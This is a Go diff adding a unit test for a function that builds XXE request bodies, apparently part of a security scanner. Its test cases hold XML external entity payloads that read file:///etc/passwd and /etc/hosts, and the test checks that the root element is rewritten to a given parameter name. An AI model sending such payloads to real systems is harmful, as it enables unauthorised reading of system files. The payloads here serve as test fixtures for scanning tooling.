@@ -2169,3 +2169,65 @@ func TestDetect_VerboseMode(t *testing.T) {
 		t.Fatal("result should not be nil")
 	}
 }
+
+func TestBuildXXEBody(t *testing.T) {
+	tests := []struct {
+		name      string
+		payload   string
+		paramName string
+		wantHas   []string
+		wantNot   []string
+	}{
+		{
+			name: "classic passwd payload rewrites root element",
+			payload: `<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>`,
+			paramName: "user",
+			wantHas:   []string{"<!DOCTYPE user", "<user>&xxe;</user>", `<?xml version="1.0"?>`},
+			wantNot:   []string{"<foo>", "<!DOCTYPE foo"},
+		},
+		{
+			name: "error-based payload rewrites root element",
+			payload: `<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///nonexistent">
+]>
+<foo>test</foo>`,
+			paramName: "search",
+			wantHas:   []string{"<!DOCTYPE search", "<search>&xxe;</search>"},
+			wantNot:   []string{"<foo>", "<!DOCTYPE foo"},
+		},
+		{
+			name:      "no DOCTYPE wraps in element",
+			payload:   "&xxe;",
+			paramName: "data",
+			wantHas:   []string{"<data>&xxe;</data>", `<?xml version="1.0"?>`},
+		},
+		{
+			name:      "lowercase doctype handled",
+			payload:   `<?xml version="1.0"?><!doctype foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>`,
+			paramName: "input",
+			wantHas:   []string{"<input>&xxe;</input>"},
+			wantNot:   []string{"<foo>"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := buildXXEBody(tt.payload, tt.paramName)
+			for _, want := range tt.wantHas {
+				if !strings.Contains(got, want) {
+					t.Errorf("buildXXEBody() missing %q in:\n%s", want, got)
+				}
+			}
+			for _, notWant := range tt.wantNot {
+				if strings.Contains(got, notWant) {
+					t.Errorf("buildXXEBody() should not contain %q in:\n%s", notWant, got)
+				}
+			}
+		})
+	}
+}
